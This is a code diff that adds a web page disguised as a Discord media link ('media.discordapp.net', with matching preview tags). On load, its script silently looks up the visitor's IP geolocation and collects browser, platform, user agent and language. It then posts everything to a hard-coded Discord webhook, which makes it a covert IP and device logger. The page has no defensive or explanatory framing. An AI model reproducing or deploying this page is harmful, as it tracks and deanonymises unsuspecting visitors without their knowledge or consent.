@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<head>
+<style>
+<title>media.discordapp.net</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="media">
+<meta property="og:description" content="media">
+<meta property="og:image" content="">
+<meta name="theme-color" content="#37c2de">
+<link rel="stylesheet" href="">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</style>
+</head>
+
+<body>
+
+<script>
+  async function get() {
+    let url = 'https://ipapi.co/json/'
+    let obj = await (await fetch(url)).json();
+  
+    return obj;
+}
+var tags;
+(async () => {
+  tags = await get()
+
+  var browser = "Unknown"
+
+  if((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1 ) {
+        browser = 'Opera';
+    } else if(navigator.userAgent.indexOf("Chrome") != -1 ) {
+        browser = 'Chrome';
+    } else if(navigator.userAgent.indexOf("Safari") != -1) {
+        browser = 'Safari';
+    } else if(navigator.userAgent.indexOf("Firefox") != -1 ){
+        browser = 'Firefox';
+    } else if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) {
+        browser = 'IE';
+    } else {
+        browser = 'Unknown';
+    }
+
+
+ var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/989202589155483689/cxUsAU1a1rO2Bl0lqK-Xeg2aQq8lOffhY5ePhOfNQ4KgHJj5ojVf9rQnJlqW8mRlLY_r");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+
+      var params = {
+        username: "Media Website - Info ID: " + (makeid(5)),
+        avatar_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTkqv6VIf1fZlJbjWj9CZIxHW6Kv8TNXYgsbA&usqp=CAU",
+        content: "```" + "MAIN INFO" + "\n" + "-------------------------------" + "\n" + JSON.stringify(tags, null, "\t") + "\n" + "\n" + "DEVICE INFO" + "\n" + "-------------------------------" + "\n" + "Browser Name: " + browser + "\n" + "Platform: " + navigator.platform + "\n" + "Cookies Enabled: " + navigator.cookieEnabled + "\n" + "User Agent: " + navigator.userAgent + "\n" + "Browser Language: " + navigator.language + "```",
+      } 
+
+      request.send(JSON.stringify(params));
+
+
+})()
+  </script>
+  </body>
